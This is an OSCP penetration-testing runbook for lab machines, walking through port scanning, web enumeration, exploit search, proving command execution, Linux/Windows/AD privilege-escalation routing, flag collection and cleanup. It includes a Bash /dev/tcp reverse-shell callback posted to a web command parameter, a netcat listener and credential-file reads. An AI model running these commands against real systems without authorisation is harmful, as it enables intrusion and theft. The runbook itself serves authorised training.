---
tags: [OSCP, RUNBOOKV2, FollowAlong, Methodology, Triage]
status: Active
---

# RUNBOOK V2 -- Follow-Along Controller

**Use this page when you have a new box and do not want to rely on memory, Codex, or Claude.**

This is the controller for the whole runbook. Start at Step 0 and move down until you reach a shell, then follow the branch that matches the evidence in front of you. Every branch has the same rhythm:

1. Read the explanation.
2. Run the command block.
3. Compare your output with the success clues.
4. Choose exactly one matching row under **What did you get?**.
5. Open the linked RUNBOOK page and continue from there.

If the output is unfamiliar, pause and open [[How to Read Output]]. It explains what the common status codes, banners, permissions, identities, and failure messages mean before you choose a route.

Do not jump to a random exploit because the machine description mentions it. Let the evidence choose the branch.

> [!tip] 💡 You are allowed to be slow
> If a command fails, stop and use the failure row for that stage. Most wasted OSCP time comes from repeating a command without deciding what its output means.

> [!tip] 💡 Three-pass reading
> First identify the confirmed fact. Second identify the one value needed next, such as a port, version, hostname, path, or identity. Third choose the cheapest command that proves the next branch. The example output on each page is a shape to compare against, not a result to force.

> [!warning] 💡 Manual run versus agent run
> Reserve `~/Platforms/` for your own manual sessions and final write-up inputs. If Codex or another agent is actively working a box, use a private temporary directory made with `mktemp -d /home/kali/.codex/tmp/BOX_NAME-codex.XXXXXX`. Do not run `boxstart` for the agent session because it creates logs, loot, and state inside `~/Platforms/`.

When you take over an agent run, copy only the evidence you deliberately want into your manual workspace after reviewing it. Keep raw agent logs and private loot in the temporary directory until then.

## The one-page mental model

```text
Scope and VPN
     |
     v
Full TCP scan + UDP check
     |
     v
Port and service triage
     |
     +-- Linux services --> Linux service, web, exploit, shell, local enum
     |
     +-- UDP IKE/IPSec --> SNMP or PSK recovery, transport policy, then hidden TCP services
     +-- Windows services --> Windows service, web/SMB, shell, privesc
     |
     +-- AD services --> clock, anonymous enum, credentials, BloodHound, lateral movement
     |
     v
Every shell: identity -> credentials -> privileges -> local services -> proof
     |
     v
Collect flags privately -> clean up -> boxdone -> write up
```

## Step 0. Set the variables before touching the target

Only the values in this block are target-specific. `$BoxIP` is the target address, `$LocalIP` is the VPN address used for callbacks, and `$BoxDir` is the local evidence directory. Do not paste a literal password, hash, key, or flag into a shared note.

If this is a new box, replace only `BOX_NAME_HERE` and `TARGET_IP_HERE`, then run:

```bash
boxstart "BOX_NAME_HERE" "TARGET_IP_HERE" htb
```

Use `offsec` or `thm` instead of `htb` when appropriate. `boxstart` creates the workspace, loads `$BoxName`, `$BoxIP`, `$BoxDir`, and `$LocalIP`, and starts the command log. If the box was already started in another terminal, run `boxload` instead:

```bash
boxload
```

Now set only the values you know. Leave `$Domain`, `$FQDN`, and `$WebPort` alone until enumeration tells you what they are:

```bash
boxset LocalIP "$(ip addr show tun0 2>/dev/null | awk '/inet / {sub(/\/.*/,"",$2); print $2; exit}')"
boxset SSHPort 22
boxset Lport 4444
```

If `boxstart` or `boxload` prints an error, stop and fix that first. Do not run `boxset` before a box is loaded. Then confirm the workspace and VPN:

```bash
printf 'Target: %s\nLocal: %s\nWorkspace: %s\n' "$BoxIP" "$LocalIP" "$BoxDir"
mkdir -p "$BoxDir/nmap" "$BoxDir/loot" "$BoxDir/exploits" "$BoxDir/screenshots"
ip addr show tun0
```

> [!warning] 💡 Variable failure
> If a command prints an empty target, callback address, or workspace path, stop. Run the `boxset` block again. An empty `$BoxIP` can make a correct command look like a tool failure.

## Step 1. Confirm VPN reachability

Run this before changing exploit parameters. It separates a routing problem from a target problem.

```bash
ip addr show tun0
ping -c 1 "$BoxIP"
nc -vz -w 3 "$BoxIP" 22
nc -vz -w 3 "$BoxIP" 80
```

Choose your result:

- [ ] `tun0` is absent -> reconnect the VPN, then return here
- [ ] `tun0` exists but ping fails -> continue with Nmap because ICMP may be blocked
- [ ] Nmap and TCP probes fail -> verify `$BoxIP`, VPN routing, and that the lab machine is running
- [ ] One TCP port answers -> continue to Step 2; the host is reachable

Focus on the distinction between **route failure** and **ICMP filtering**. A failed ping does not stop the assessment if a TCP probe or Nmap scan answers. A missing `tun0` or a failed TCP probe means fix connectivity before changing exploit commands.

## Step 2. Find every TCP port

The first scan is for discovering services that are not on usual ports. It is not the final version scan.

```bash
sudo nmap -Pn -n -sS -p- --min-rate 5000 --max-retries 2 --host-timeout 5m -T4 "$BoxIP" -oA "$BoxDir/nmap/allports"
sed -n '1,240p' "$BoxDir/nmap/allports.nmap"
```

While it runs, perform a low-noise UDP check. UDP `open|filtered` means Nmap could not prove whether a service answered.

```bash
sudo nmap -Pn -n -sU --top-ports 100 "$BoxIP" -oA "$BoxDir/nmap/udp-top100"
```

> [!tip] ⚡ More efficient path
> Start TCP and UDP in separate terminals. Do not wait for UDP before beginning the TCP service scan and web review.

> [!tip] 🛠️ Alternative tool
> `masscan` is useful for a fast first pass, but always confirm the result with Nmap:

```bash
sudo masscan "$BoxIP" -p1-65535 --rate 1000
sudo nmap -Pn -n -sC -sV -p"$OpenPorts" "$BoxIP" -oA "$BoxDir/nmap/services"
```

## Step 3. Triage the ports, do not guess the OS

Build `$OpenPorts` from the full scan, then run the service scan. This avoids hand-copying a port and missing one:

```bash
OpenPorts="$(awk '$1 ~ /^[0-9]+\/tcp$/ && $2 == "open" {sub("/tcp", "", $1); ports=ports (ports ? "," : "") $1} END {print ports}' "$BoxDir/nmap/allports.nmap")"
boxset OpenPorts "$OpenPorts"
sudo nmap -Pn -n -sC -sV -p"$OpenPorts" "$BoxIP" -oA "$BoxDir/nmap/services"
```

If the command prints an empty value, open `$BoxDir/nmap/allports.nmap`, copy the open TCP ports as a comma-separated list, and run `boxset OpenPorts "PORTS_FROM_SCAN"` after replacing the uppercase text.

Use this table:

| Evidence | Open next page |
|---|---|
| 53, 88, 389, 445, 464, 636, 3268, or 5985 together | [[AD - Service Scan]] |
| 445, 3389, 5985, or Windows web services without the AD set | [[Windows - Service Scan]] |
| 22 plus HTTP, HTTPS, FTP, SMTP, SNMP, or Linux-looking service | [[Linux - Service Scan]] |
| UDP 161 is open | [[Linux - SNMP Enum]] |
| UDP 500 is open as IKE or ISAKMP | [[Windows - IKE-IPSec Transport]] |
| Only HTTP or HTTPS | [[Linux - Web Enum]] first for the initial fingerprint, then route to the Linux or Windows web page from the banner |
| Unknown or custom service | Check the web root for a client or binary, then [[Linux - Binary Analysis]] or [[Linux - Exploit Search]] |

> [!warning] 💡 Port triage gotcha
> One SSH banner does not prove Linux, and one HTTP service does not prove the machine is simple. The service combination chooses the branch.

## Step 2A. If UDP IKE or IPSec is exposed

UDP 500 can be the gate in front of the real TCP service list. Fingerprint the peer first, then open [[Windows - IKE-IPSec Transport]] so the proposal, PSK, traffic selector, and XFRM policy are recorded before the TCP service scan is repeated.

```bash
sudo ike-scan -M "$BoxIP" | tee "$BoxDir/loot/ike-scan.txt"
```

If SNMP is also open, run [[Linux - SNMP Enum]] before configuring the policy. A Windows system may disclose the IKE PSK through management metadata even though the page is named for Linux for historical reasons.

After the CHILD_SA is established, return to [[Windows - Service Scan]] and save the new scan separately from the pre-IPSec result.

## Step 4. If there is web, enumerate it carefully

Before copying the web commands, set `$WebPort` to the actual web port from the service scan. If more than one web port is open, repeat this stage once per port:

```bash
boxset WebPort 80
```

Replace `80` with the discovered port before pressing Enter. A web port is not always 80 or 443. Then open the page manually first and save the response before scanning so you can review source, comments, forms, versions, and redirects.

```bash
curl -i "http://$BoxIP:$WebPort/" | tee "$BoxDir/loot/index.headers.txt"
curl -sS "http://$BoxIP:$WebPort/" -o "$BoxDir/loot/index.html"
whatweb "http://$BoxIP:$WebPort/" | tee "$BoxDir/loot/whatweb.txt"
curl -i "http://$BoxIP:$WebPort/robots.txt" | tee "$BoxDir/loot/robots.txt"
grep -Ein 'version|generator|powered|admin|login|upload|comment|debug|api' "$BoxDir/loot/index.html"
```

Start content discovery gently. Use 10 to 20 threads on an older or custom server, then increase only if it remains healthy.

```bash
gobuster dir -u "http://$BoxIP:$WebPort/" -w /usr/share/wordlists/dirb/common.txt -x php,txt,html,bak,old,zip -t 10 -o "$BoxDir/nmap/gobuster.txt"
```

If installed, Feroxbuster is useful for recursion and response filtering:

```bash
feroxbuster -u "http://$BoxIP:$WebPort/" -w /usr/share/wordlists/dirb/common.txt -x php,txt,html,bak,old,zip -t 20 -o "$BoxDir/nmap/ferox.txt"
```

Choose the matching web branch:

- [ ] CMS or framework identified -> [[Linux - CMS Check]]
- [ ] IIS, ASP, or a Windows web banner is identified -> [[Windows - Web Enum]]
- [ ] Tomcat Manager is identified -> [[Windows - Web - Tomcat]]
- [ ] Jenkins, WordPress, Joomla, Drupal, or another named application is identified -> [[Common Applications (Decision Tree)]]
- [ ] Versioned product identified -> [[Linux - Exploit Search]]
- [ ] Login form found -> test known credentials once, then [[Linux - Credential Search]]
- [ ] File upload found -> [[Linux - File Upload]]
- [ ] Parameter reads a local file -> [[Linux - LFI]]
- [ ] Parameter causes a command or diagnostic action -> [[Linux - Command Injection]]
- [ ] CGI directory or executable script identified -> [[Linux - Shellshock CGI]]
- [ ] Server fetches a remote URL -> [[Linux - RFI]] or the SSRF branch in [[Web Applications (Decision Tree)]]
- [ ] Downloadable binary or archive found -> save it, run `file`, then [[Linux - Binary Analysis]]
- [ ] Interesting path returns 401 or 403 -> record it and continue; the status proves the route exists
- [ ] Nothing useful appears -> [[Linux - Exploit Search]], then return here for vhosts and parameters

> [!warning] 💡 Scanner gotcha
> If a legacy server refuses connections, stop the scanner, wait for recovery, and use `curl` manually. A high thread count can create a false impression that the service is down.

## Step 5. If you find a version or exploit

Do not run an exploit just because SearchSploit found a title. Open [[Exploit Editing and Resource Guide]] and follow its copy, review, patch, syntax-check, proof, and callback sequence.

The short route is. Replace the uppercase values from the service scan before pressing Enter:

```bash
boxset Product "PRODUCT_FROM_SCAN"
boxset Version "VERSION_FROM_SCAN"
searchsploit "$Product" "$Version"
```

Copy the numeric ID for the candidate you want to inspect, replace `EXPLOIT_ID_FROM_RESULTS`, and then run:

```bash
boxset ExploitId "EXPLOIT_ID_FROM_RESULTS"
searchsploit -x "$ExploitId"
searchsploit -m "$ExploitId" | tee "$BoxDir/loot/searchsploit-copy.txt"
```

Now open [[Exploit Editing and Resource Guide]] to identify the copied filename, preserve the original, and perform the source review and syntax check.

If you need a callback, do not start there. First prove the exploit with `id`, then go to [[Linux - RCE to Shell]] or [[Windows - Shell Received]].

## Step 6. Prove command execution before chasing a shell

The proof command should be harmless and should tell you who executed it.

```bash
id
whoami
hostname
uname -a
```

For an HTTP command parameter, use URL-encoding so shell metacharacters survive the form parser:

```bash
curl -sS -G "http://$BoxIP:$WebPort/$Path" --data-urlencode 'cmd=id'
```

For a public exploit with a command argument:

```bash
python3 "$BoxDir/exploits/$ExploitName" "$BoxIP" "$WebPort" "id"
```

Choose your result:

- [ ] Output contains `uid=`, `whoami`, or a known command result -> RCE is real; [[Linux - RCE to Shell]]
- [ ] Exploit reports success but no output appears -> inspect the response, check command syntax, and rerun `id`
- [ ] Target crashes or stops responding -> check prerequisites, wait for recovery, and retry once before resetting
- [ ] No response at all -> return to the service scan, confirm the port, and check whether a hostname is required

## Step 7. Catch and stabilise the callback

Set `$Lport` to a listening port and confirm `$LocalIP` is the VPN address. Start the listener before sending the payload.

```bash
nc -lvnp "$Lport"
```

Use the simplest callback that matches the target interpreter. A common Bash callback is. The double quotes around the local `Command` assignment expand `$LocalIP` and `$Lport` before the value is sent to the target:

```bash
Command="bash -c 'bash -i >& /dev/tcp/$LocalIP/$Lport 0>&1'"
```

If the callback contains `&`, `=`, `+`, spaces, or quotes inside an HTTP form field, send it with `--data-urlencode`, not raw `--data`:

```bash
curl -sS -X POST --data-urlencode "cmd=$Command" "http://$BoxIP:$WebPort/$Path"
```

When a callback arrives:

```bash
id
whoami
hostname
```

For a Linux shell:

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

Press `Ctrl+Z`, then run locally:

```bash
stty raw -echo; fg
export TERM=xterm
```

Open [[Linux - Shell Stabilise]] if the terminal is broken. For a Windows shell, open [[Windows - Shell Received]].

> [!tip] 🛠️ Better payload selection
> Use [RevShells](https://www.revshells.com/) to choose a callback for the target interpreter and network conditions. Bring the resulting payload back into the runbook, set `$LocalIP` and `$Lport`, and validate it with a harmless command first.

## Step 8. Every Linux shell follows the same local-enumeration order

Do not start with a random kernel exploit. Run the cheap, high-value checks first:

```bash
id
whoami
hostname
pwd
uname -a
cat /etc/os-release 2>/dev/null
env | sort
cat /etc/passwd
ls -la /home /tmp /var/www /opt 2>/dev/null
ps auxww
ss -lntup 2>/dev/null || netstat -lntup 2>/dev/null
sudo -n -l 2>/dev/null || sudo -l
find / -perm -4000 -type f 2>/dev/null
getcap -r / 2>/dev/null
find / -type f -writable 2>/dev/null | head -n 200
```

Then use the page that matches the evidence:

| Evidence | Open next page |
|---|---|
| A sudo rule exists | [[Linux - Sudo Check]] |
| A non-standard SUID file exists | [[Linux - SUID Check]] |
| A writable script is called by cron | [[Linux - Cron Check]] |
| A credential, hash, backup, key, or config appears | [[Linux - Credential Search]] |
| A loopback-only service is listening | [[Linux - Port Forwarding]] |
| A readable custom binary is found | [[Linux - Binary Analysis]] |
| Nothing useful is found | Run credential search, then [[Linux - Kernel Exploit]] only after safer paths are exhausted |

Use [[Linux - Local Enum]] as the detailed companion page. Use the completed [[OSCP/BOXES/WRITE UPS/Linux/Traverxec|Traverxec]] write-up if you need to see this route executed from a low-privilege web account to root.

## Step 9. Every Windows shell follows the same local-enumeration order

Run identity, privilege, service, scheduled-task, network, and credential checks before choosing a privesc technique.

```powershell
whoami /all
hostname
systeminfo
ipconfig /all
route print
netstat -ano
tasklist /v
cmdkey /list
Get-ChildItem -Force
Get-LocalGroupMember Administrators
schtasks /query /fo LIST /v
sc.exe query state= all
```

Choose the next page:

- [ ] SeImpersonatePrivilege or SeAssignPrimaryTokenPrivilege is enabled -> [[Windows - SeImpersonate Abuse]]
- [ ] A service binary or service path is writable -> [[Windows - Service Abuse]]
- [ ] A scheduled-task executable or script is writable -> [[Windows - Scheduled Task Abuse]]
- [ ] Inherited full control is found on a protected file or directory -> [[Windows - Privesc - ACL Misconfiguration]]
- [ ] Valid credentials exist but no interactive logon works -> [[Windows - RunasCs]]
- [ ] A loopback-only service is found -> [[Windows - Port Forwarding]]
- [ ] A registry, transcript, browser, or configuration credential appears -> [[Windows - Credential Search]]
- [ ] The account has SeBackupPrivilege and the host is a domain controller -> [[AD - Backup Operators]]
- [ ] Nothing useful appears -> return to Windows service and credential pages; only then assess kernel candidates

## Step 10. Every AD chain follows this order

When the port combination suggests Active Directory, stop using a standalone Linux or Windows checklist. Use this sequence:

1. [[AD - Service Scan]] -- identify the domain, DC, and Kerberos, LDAP, SMB, and WinRM services.
2. [[AD - Clock Sync]] -- fix time before Kerberos tools fail with clock skew.
3. [[AD - Anonymous Enum]] -- test RPC, LDAP, SMB, and readable replication content.
4. [[AD - Web Enum]] -- collect usernames, hostnames, and application clues.
5. [[AD - AS-REP Roasting]] and [[AD - Kerberoasting]] -- request crackable Kerberos material where justified.
6. [[AD - Credential Validation]] -- validate one recovered credential against relevant services.
7. [[AD - WinRM Foothold]] -- open a shell when WinRM access is available.
8. [[AD - Group Triage]] and [[AD - Privilege Triage]] -- route group and token privileges.
9. [[AD - Local Credential Search]] and [[AD - BloodHound]] -- search local stores and map ACL paths.
10. Use the matching escalation page: [[AD - Resource-Based Constrained Delegation]], [[AD - ForceChangePassword]], [[AD - Backup Operators]], [[AD - Account Operators Abuse]], or [[AD - DCSync Grant]].
11. [[AD - DCSync Dump]] and [[AD - Pass the Hash]] -- use only after rights are confirmed.
12. [[AD - Clean Down]] -- remove controlled accounts, delegation, scripts, and clock changes.

> [!warning] 💡 AD credential rule
> Never spray a password list before checking the password policy and lockout behaviour. A valid username with a wrong password is still an authentication attempt.

## Step 11. If you need to develop or edit an exploit

Open [[Exploit Editing and Resource Guide]] and follow its copy, review, patch, syntax-check, proof, callback, and failure-recovery sequence.

The required order is:

1. Confirm the product, version, protocol, and prerequisite.
2. Search with SearchSploit and read the source.
3. Copy the exploit to `$BoxDir/exploits/` and preserve the original.
4. Find hard-coded target, callback, port, path, payload, and architecture values.
5. Change one thing at a time.
6. Compile or syntax-check locally.
7. Run `id` or another harmless proof.
8. Catch the callback only after the proof works.

Use these references from inside the runbook:

| Need | Resource | Return to |
|---|---|---|
| Encode, decode, URL-encode, base64, hex, or transform data | [CyberChef](https://gchq.github.io/CyberChef/) | Save the result to private loot, then test a harmless value |
| Choose a reverse shell for Bash, Python, PHP, PowerShell, or Netcat | [RevShells](https://www.revshells.com/) | Set `$LocalIP` and `$Lport`, start the listener, and test |
| Understand a vulnerability, service, protocol, or GTFOBins escape | [HackTricks](https://book.hacktricks.wiki/en/index.html) | Record the prerequisite and use the matching stage |
| Find payload syntax, bypasses, or technique examples | [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings) | Reduce the example to a harmless proof, then adapt it |
| Watch a practical box or technique explanation | [ippsec.rocks](https://ippsec.rocks/) | Reproduce the result using the runbook command and variables |

> [!warning] 💡 Resource rule
> A reference page is a source of technique knowledge, not proof that your target is vulnerable. Confirm the product, version, prerequisite, response, and privilege level in the runbook.

## Step 12. If you are stuck, use this reset checklist

Do this in order. Do not repeatedly fire the same exploit.

```bash
sed -n '1,240p' "$BoxDir/nmap/allports.nmap"
sed -n '1,240p' "$BoxDir/nmap/services.nmap"
sudo nmap -Pn -n -sU --top-ports 20 "$BoxIP"
curl -i "http://$BoxIP:$WebPort/"
curl -i "http://$BoxIP:$WebPort/robots.txt"
grep -RniE 'password|passwd|secret|token|key|user|admin|upload|exec|system' "$BoxDir/loot" 2>/dev/null
```

Ask these questions:

- Did I scan every TCP port?
- Did I check UDP?
- Did I run the service scan against every discovered port?
- Did I try the hostname from the banner, certificate, redirect, or page source?
- Did I read HTML comments, JavaScript, `robots.txt`, and downloaded archives?
- Did I save source and inspect it before testing a web exploit?
- Did I prove `id` before trying a reverse shell?
- Did I check the target's available interpreter and callback egress?
- Did I rerun local enumeration after moving from a service account to a real user?
- Did I read exact sudo or service arguments rather than just the binary name?

If any answer is no, return to that stage. If all answers are yes, use the technique-specific decision tree and a completed write-up link for an example.

## Step 13. Collect proof and close the box

When a shell reaches the required privilege, confirm it before touching flags:

```bash
id
whoami
hostname
```

Then read the correct proof file from the target shell and store its value in your private loot workflow. Do not put the flag in the write-up or a shared command block:

```bash
CurrentUser="$(id -un)"
cat "/home/$CurrentUser/user.txt" 2>/dev/null
cat /root/root.txt 2>/dev/null
```

For Windows:

```powershell
whoami
hostname
type "$env:USERPROFILE\Desktop\user.txt"
type C:\Users\Administrator\Desktop\root.txt
```

After recording the flag values privately, close the target shell and run `boxdone` in the local Kali terminal. This cleans the session marker and finalises the command log.

Before closing:

1. Remove only the payloads you recorded.
2. Restore modified files, ACLs, services, sudoers, accounts, and delegation.
3. Close listeners, tunnels, shells, and temporary HTTP servers.
4. Verify cleanup.
5. Run `boxdone`.
6. Write the box note from the raw log and private loot.

Open [[Linux - Clean Down]], [[Windows - Clean Down]], or [[AD - Clean Down]] for the exact cleanup branch.

## Completed examples inside the vault

Use these when the current branch feels unfamiliar. They demonstrate the controller without replacing evidence from the new target.

- [[OSCP/BOXES/WRITE UPS/Linux/Networked|Networked]] -- source review, upload bypass, webshell, cron injection, and sudo configuration parsing
- [[OSCP/BOXES/WRITE UPS/Linux/Poison|Poison]] -- LFI, encoded credential recovery, SSH, local forwarding, and VNC
- [[OSCP/BOXES/WRITE UPS/Linux/Valentine|Valentine]] -- Heartbleed, encrypted SSH key handling, and tmux session access
- [[OSCP/BOXES/WRITE UPS/Linux/Traverxec|Traverxec]] -- Nostromo RCE, protected archive, encrypted key cracking, and pager escape
- [[OSCP/BOXES/WRITE UPS/Linux/TartarSauce|TartarSauce]] -- WordPress RFI and tar-based privilege escalation
- [[OSCP/BOXES/WRITE UPS/Linux/Shocker|Shocker]] -- CGI Shellshock proof, Bash callback, and passwordless Perl sudo
- [[OSCP/BOXES/WRITE UPS/Windows/Buff|Buff]] -- web upload, internal port forwarding, and Windows BOF
- [[OSCP/BOXES/WRITE UPS/Windows/Legacy|Legacy]] -- Windows XP SMBv1/RPC enumeration, manual MS08-067 source adaptation, and target-side bind shell
- [[OSCP/BOXES/WRITE UPS/AD/RockyColt|RockyColt]] -- anonymous LDAP, Tomcat, credential recovery, and RBCD
- [[OSCP/BOXES/WRITE UPS/AD/Fermion|Fermion]] -- Jenkins, cleartext cloud logs, scheduled-task abuse, and AD extraction

## Final rule

This page exists so a blank slate never becomes a blank mind. Start here, follow the evidence, use the failure rows, and keep every command, screenshot, credential, and proof artifact in the workspace as you go.
